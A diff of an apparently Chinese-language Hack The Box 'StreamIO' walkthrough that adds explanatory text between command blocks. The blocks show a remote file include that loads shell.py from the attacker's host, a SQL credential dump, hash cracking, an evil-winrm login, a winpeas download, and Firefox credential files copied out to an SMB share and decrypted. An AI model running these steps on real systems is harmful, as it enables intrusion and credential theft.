 </span></span><span style="display:flex;"><span>└─$ curl -X POST <span style="color:#e6db74">&#39;https://streamio.htb/admin/?debug=master.php&#39;</span> -k -b <span style="color:#e6db74">&#39;PHPSESSID=o39friqont7cboifpts1bnjbq0&#39;</span> -d <span style="color:#e6db74">&#39;include=http://10.10.16.58/shell.py&#39;</span>                  
 </span></span></code></pre></div><p><img src="Pasted%20image%2020260330174302.png" alt=""></p>
+<h2 id="获得-nikk37-权限">获得 nikk37 权限</h2>
+<p>之前的渗透过程中多次使用到数据库，在 <code>treamio.htb</code> 主界面尝试搜索数据库相关的信息。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub&gt; cd streamio.htb
 </span></span><span style="display:flex;"><span>cd streamio.htb
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\s</span>treamio.htb&gt; dir -recurse *.php | <span style="color:#66d9ef">select</span>-string -pattern <span style="color:#e6db74">&#34;database&#34;</span>
@@ -987,10 +1021,13 @@
 </span></span><span style="display:flex;"><span>dir -recurse *.php | <span style="color:#66d9ef">select</span>-string -pattern <span style="color:#e6db74">&#34;database&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>search.php:15:$connection <span style="color:#f92672">=</span> array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Database&#34;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#34;STREAMIO&#34;</span>, <span style="color:#e6db74">&#34;UID&#34;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;db_user&#34;</span>, <span style="color:#e6db74">&#34;PWD&#34;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;B1@hB1@hB1@h&#39;</span><span style="color:#f92672">)</span>;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub&gt; where.exe sqlcmd.exe
+</span></span></code></pre></div><p>找到很数据库凭据 <code>db_admin:B1@hx31234567890</code>、<code>db_user:B1@hB1@hB1@h</code> ，使用 mssql 自带的 sqlcmd 查询数据。</p>
+<p>寻找 sqlcmd 的位置。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub&gt; where.exe sqlcmd.exe
 </span></span><span style="display:flex;"><span>where.exe sqlcmd.exe
 </span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\M</span>icrosoft SQL Server<span style="color:#ae81ff">\C</span>lient SDK<span style="color:#ae81ff">\O</span>DBC<span style="color:#ae81ff">\1</span>70<span style="color:#ae81ff">\T</span>ools<span style="color:#ae81ff">\B</span>inn<span style="color:#ae81ff">\S</span>QLCMD.EXE
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\s</span>treamio.htb<span style="color:#ae81ff">\a</span>dmin&gt; sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span style="color:#e6db74">&#34;select name from sys.tables;&#34;</span>
+</span></span></code></pre></div><p>使用 sqlcmd 查询本地 MSSQL实例 <code>localhost</code> 中，指定 SQL 用户名为 <code>db_admin</code>，密码为 <code>B1@hx31234567890</code>，数据库名为之前发现的  <code>streamio_back</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\s</span>treamio.htb<span style="color:#ae81ff">\a</span>dmin&gt; sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span style="color:#e6db74">&#34;select name from sys.tables;&#34;</span>
 </span></span><span style="display:flex;"><span>sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span style="color:#e6db74">&#34;select name from sys.tables;&#34;</span>
 </span></span><span style="display:flex;"><span>name                                                                                                                            
 </span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------------------------
@@ -998,7 +1035,8 @@
 </span></span><span style="display:flex;"><span>users                                                                                                                           
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> rows affected<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\s</span>treamio.htb<span style="color:#ae81ff">\a</span>dmin&gt; sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span style="color:#e6db74">&#34;select * from users;&#34;</span>
+</span></span></code></pre></div><p>tables 有两个，显然 users 可能更有价值，先查看 users 中的信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\s</span>treamio.htb<span style="color:#ae81ff">\a</span>dmin&gt; sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span style="color:#e6db74">&#34;select * from users;&#34;</span>
 </span></span><span style="display:flex;"><span>sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span style="color:#e6db74">&#34;select * from users;&#34;</span>
 </span></span><span style="display:flex;"><span>id          username                                           password                                          
 </span></span><span style="display:flex;"><span>----------- -------------------------------------------------- --------------------------------------------------
@@ -1012,7 +1050,8 @@
 </span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">8</span> Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> rows affected<span style="color:#f92672">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>查询到许多账号密码，保存至 kali。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ vim user_creds_raw      
 </span></span><span style="display:flex;"><span>                                                                                                                                                                        
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
@@ -1025,7 +1064,8 @@
 </span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">6</span> Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
 </span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">7</span> William                                            d62be0dc82071bccc1322d64ec5b6c51                  
 </span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">8</span> Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>进一步处理数据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat user_creds_raw | awk -F <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;{print $2&#34;:&#34;$3}&#39;</span> | tee user_creds
 </span></span><span style="display:flex;"><span>nikk37:389d14cb8e4e9b94b137deb1caf0612a
 </span></span><span style="display:flex;"><span>yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
@@ -1035,7 +1075,8 @@
 </span></span><span style="display:flex;"><span>Lauren:08344b85b329d7efd611b7a7743e8a09
 </span></span><span style="display:flex;"><span>William:d62be0dc82071bccc1322d64ec5b6c51
 </span></span><span style="display:flex;"><span>Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>使用 hashcat 破解凭据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">0</span> user_creds /usr/share/wordlists/rockyou.txt --user
 </span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
 </span></span><span style="display:flex;"><span>
@@ -1108,7 +1149,8 @@
 </span></span><span style="display:flex;"><span>yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
 </span></span><span style="display:flex;"><span>Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
 </span></span><span style="display:flex;"><span>Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers&gt; dir
+</span></span></code></pre></div><p>查看有家目录的用户。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers&gt; dir
 </span></span><span style="display:flex;"><span>             dir
 </span></span><span style="display:flex;"><span>dir
 </span></span><span style="display:flex;"><span>
@@ -1125,13 +1167,8 @@
 </span></span><span style="display:flex;"><span>d-----         5/9/2022   5:38 PM                Martin                                                                
 </span></span><span style="display:flex;"><span>d-----        2/26/2022   9:48 AM                nikk37                                                                
 </span></span><span style="display:flex;"><span>d-r---        2/22/2022   1:33 AM                Public
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ hashcat --help | grep <span style="color:#e6db74">&#39;user&#39;</span>
-</span></span><span style="display:flex;"><span>     --username                 |      | Enable ignoring of usernames in hashfile             |
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">29000</span> | sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>utf16le<span style="color:#f92672">(</span>$username<span style="color:#f92672">)</span>.<span style="color:#e6db74">&#39;:&#39;</span>.utf16le<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>    | Operating System
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">25400</span> | PDF 1.4 - 1.6 <span style="color:#f92672">(</span>Acrobat <span style="color:#ae81ff">5</span> - 8<span style="color:#f92672">)</span> - user and owner pass        | Document
-</span></span><span style="display:flex;"><span>                                                                                                                                                                        
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>使用 evil-winrm 获得 <code>nikk37</code> 的权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ evil-winrm -u nikk37 -p <span style="color:#e6db74">&#39;get_dem_girls2@yahoo.com&#39;</span> -i streamio.htb
 </span></span><span style="display:flex;"><span>                                        
 </span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
@@ -1143,7 +1180,9 @@
 </span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
 </span></span><span style="display:flex;"><span>streamio<span style="color:#ae81ff">\n</span>ikk37
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; powershell -c wget http://10.10.16.58/winpeas.exe -outfile winpeas.exe
+</span></span></code></pre></div><h2 id="获得-jdgodd-权限">获得 JDgodd 权限</h2>
+<p>下载 <code>winpeas.exe</code> 并执行，输出结果为 <code>out.txt</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; powershell -c wget http://10.10.16.58/winpeas.exe -outfile winpeas.exe
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; dir
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -1177,11 +1216,17 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah out.txt 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2765013</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 134K Mar <span style="color:#ae81ff">31</span> 03:58 out.txt
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Looking <span style="color:#66d9ef">for</span> Firefox DBs
+</span></span></code></pre></div><p>在 linpeas 的扫描结果中发现 Firefox 可能可以被利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Looking <span style="color:#66d9ef">for</span> Firefox DBs
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">1801</span>   │ ╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">1802</span>   │     Firefox credentials file exists at C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release<span style="color:#ae81ff">\k</span>ey4.db
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">1803</span>   │ ╚ Run SharpWeb <span style="color:#f92672">(</span>https://github.com/djhohnstein/SharpWeb<span style="color:#f92672">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\5</span>rwivk2l.default&gt; pwd
+</span></span></code></pre></div><p>根据提示找到 firefox 存放 <code>key4.db</code> 与 <code>logins.json</code> 文件的地址 <code>C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default</code>。</p>
+<ul>
+<li>key4.db 是 firefox 的一个数据库，用于储存加密的敏感数据，如密码、证书和加密密钥</li>
+<li>logins.json 保存了登入凭据，使用 key4.db 加密</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\5</span>rwivk2l.default&gt; pwd
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Path
 </span></span><span style="display:flex;"><span>----
@@ -1266,12 +1311,8 @@
 </span></span><span style="display:flex;"><span>-a----        2/22/2022   2:40 AM             <span style="color:#ae81ff">50</span> times.json
 </span></span><span style="display:flex;"><span>-a----        2/22/2022   2:40 AM          <span style="color:#ae81ff">98304</span> webappsstore.sqlite
 </span></span><span style="display:flex;"><span>-a----        2/22/2022   2:42 AM            <span style="color:#ae81ff">141</span> xulstore.json
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release&gt; net use <span style="color:#ae81ff">\\</span>10.10.16.58<span style="color:#ae81ff">\E</span>nil /u:malus malus
-</span></span><span style="display:flex;"><span>The command completed successfully.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release&gt; copy key4.db <span style="color:#ae81ff">\\</span>10.10.16.58<span style="color:#ae81ff">\e</span>nil
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release&gt; copy logins.json <span style="color:#ae81ff">\\</span>10.10.16.58<span style="color:#ae81ff">\E</span>nil
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>kali 建立 smb 服务，将文件从靶机中拿回。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo impacket-smbserver Enil . -smb2support -user malus -pass malus -smb2support
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
 </span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1315,7 +1356,14 @@
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah logins.json 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2774744</span> -rwxr-xr-x <span style="color:#ae81ff">1</span> root root 2.1K Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2022</span> logins.json
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release&gt; net use <span style="color:#ae81ff">\\</span>10.10.16.58<span style="color:#ae81ff">\E</span>nil /u:malus malus
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release&gt; copy key4.db <span style="color:#ae81ff">\\</span>10.10.16.58<span style="color:#ae81ff">\e</span>nil
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles<span style="color:#ae81ff">\b</span>r53rxeg.default-release&gt; copy logins.json <span style="color:#ae81ff">\\</span>10.10.16.58<span style="color:#ae81ff">\E</span>nil
+</span></span></code></pre></div><p>将两个文件放在 firefoxs 文件夹下。</p>
+<p>使用 <code>firepwn</code> 破解凭据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah firefoxs  
 </span></span><span style="display:flex;"><span>total 300K
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2782628</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali 4.0K Mar <span style="color:#ae81ff">31</span> 09:57 .
@@ -1395,7 +1443,8 @@
 </span></span><span style="display:flex;"><span>https://slack.streamio.htb:b<span style="color:#e6db74">&#39;nikk37&#39;</span>,b<span style="color:#e6db74">&#39;n1kk1sd0p3t00:)&#39;</span>
 </span></span><span style="display:flex;"><span>https://slack.streamio.htb:b<span style="color:#e6db74">&#39;yoshihide&#39;</span>,b<span style="color:#e6db74">&#39;paddpadd@12&#39;</span>
 </span></span><span style="display:flex;"><span>https://slack.streamio.htb:b<span style="color:#e6db74">&#39;JDgodd&#39;</span>,b<span style="color:#e6db74">&#39;password@12&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>firepwn<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>将破解完的凭据保存到本地。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>firepwn<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ vim firefox_creds
 </span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                             
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>firepwn<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
@@ -1404,7 +1453,8 @@
 </span></span><span style="display:flex;"><span>https://slack.streamio.htb:b<span style="color:#e6db74">&#39;nikk37&#39;</span>,b<span style="color:#e6db74">&#39;n1kk1sd0p3t00:)&#39;</span>
 </span></span><span style="display:flex;"><span>https://slack.streamio.htb:b<span style="color:#e6db74">&#39;yoshihide&#39;</span>,b<span style="color:#e6db74">&#39;paddpadd@12&#39;</span>
 </span></span><span style="display:flex;"><span>https://slack.streamio.htb:b<span style="color:#e6db74">&#39;JDgodd&#39;</span>,b<span style="color:#e6db74">&#39;password@12&#39;</span>
